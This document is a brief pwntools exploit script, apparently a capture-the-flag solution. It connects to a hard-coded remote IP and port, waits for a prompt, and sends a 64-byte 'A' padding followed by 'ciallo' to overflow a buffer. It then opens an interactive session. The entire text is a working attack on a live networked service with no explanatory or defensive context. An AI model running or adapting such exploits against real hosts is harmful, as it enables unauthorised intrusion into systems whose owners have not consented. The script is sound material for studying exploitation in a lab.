from pwn import *
context.log_level = 'error'
PAYLOAD = b'A' * 0x40 + b'ciallo'
r = remote('103.163.47.230', 35117)
r.recvuntil(b'\xef\xbc\x9f', timeout=5)  
r.sendline(PAYLOAD)
r.interactive()
